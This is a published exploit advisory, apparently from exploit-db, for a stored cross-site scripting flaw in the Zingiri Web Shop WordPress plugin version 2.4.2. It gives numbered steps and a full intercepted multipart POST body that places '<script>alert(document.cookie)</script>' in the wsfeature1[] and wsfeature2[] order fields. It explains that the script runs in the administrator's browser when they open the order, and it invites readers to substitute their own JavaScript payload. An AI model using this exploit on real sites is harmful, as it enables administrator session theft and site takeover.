@@ -1,0 +1,69 @@
+##############################################################################
+# Wordpress Zingiri Web Shop Plugin <= 2.4.2 Stored XSS
+# Exploit Title: Wordpress Zingiri Web Shop Plugin <= 2.4.0 Stored XSS
+# Google Dork:
+# Date: 30 Apr 2012
+# Author: Mehmet Ince
+# Twitter: https://twitter.com/#!/mmetince
+# Company: Bilgi Guvenligi Akademisi ( www.bga.com.tr )
+#
+# Software Link: 
+# http://downloads.wordpress.org/plugin/zingiri-web-shop.2.4.2.zip
+# Version: 2.4.2
+# Tested on: ubuntu 11.10 with apache server on the Firefox browser.
+##############################################################################
+
+Few days ago i discovered two XSS vulnerabilities at Zingiri wp-plugin.
+After that script version updated 2.4.2 and bug fixed.
+When i realized that i checked the lastest script to learn, "what did they
+for securing code ?"
+http://www.exploit-db.com/exploits/18787/
+
+
+i saw aphpsSanitize() method at  vulnerable section. aphpsSanitize() pretty
+cool for preventing XSS.
+
+But what a luck, i discovered something else.
+Now, time to explain our new bug. That's almost same with my oldest but
+more complicated.
+
+
+step 1: Login to wordpress.
+
+step 2: Go to "Shop" menu. It's should be stay at banner.
+
+step 3: Than you'll see list ot items. Click one "t-shirt" item.
+
+step 4.1: Star Firefox's extension "Tamper Data"
+step 4: You can pass that form action. That wont be problem..! Click to
+"Order" button.
+
+-----------------------------16079283545224173541938629871\r\nContent-Disposition:
+form-data;
+name="prodid"\r\n\r\n1\r\n-----------------------------16079283545224173541938629871\r\nContent-Disposition:
+form-data;
+name="prodprice"\r\n\r\n35.95\r\n-----------------------------16079283545224173541938629871\r\nContent-Disposition:
+form-data;
+name="featuresets"\r\n\r\n1\r\n-----------------------------16079283545224173541938629871\r\nContent-Disposition:
+form-data;
+name="wsfeature1[]"\r\n\r\n"><script>alert(document.cookie)</script>\r\n\r\n-----------------------------16079283545224173541938629871\r\nContent-Disposition:
+form-data;
+name="wsfeature2[]"\r\n\r\n\"><script>alert(document.cookie)</script>\r\n-----------------------------16079283545224173541938629871\r\nContent-Disposition:
+form-data;
+name="numprod[]"\r\n\r\n1\r\n-----------------------------16079283545224173541938629871\r\nContent-Disposition:
+form-data;
+name="sub"\r\n\r\nOrder\r\n-----------------------------16079283545224173541938629871--\r\n
+
+write your javascript payload to wsfeature1[] and wsfeature2[] variable.
+
+step 4.2: After you send POST request. you'll see some pop-ups. click ok
+and go
+
+step 5: There is confirmation about the Shopping. Click "checkout" to pass
+that page.
+
+step 6: Click to "Checkout"
+
+step 7: When administrator open your order details. Your javascript
+payload'll come from database and execute on the administrator side.
+But victem have to click detail of your order. Like that "WEB20128-08".
